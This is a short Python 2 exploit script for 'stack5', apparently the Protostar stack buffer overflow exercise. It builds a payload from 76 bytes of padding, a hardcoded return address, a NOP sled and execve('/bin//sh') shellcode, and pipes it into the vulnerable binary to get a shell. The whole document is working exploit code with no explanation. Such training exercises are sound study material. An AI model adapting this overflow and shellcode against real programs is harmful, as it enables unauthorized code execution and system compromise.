#usage : python stack5exp.py > a.txt;(cat a.txt;cat) | ./stack5

import struct

tampon= "A"*76
eip=struct.pack('<I',0xbffff7bd)
buf="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
nope="\x90"*23
payload=tampon+eip+nope+buf
print payload
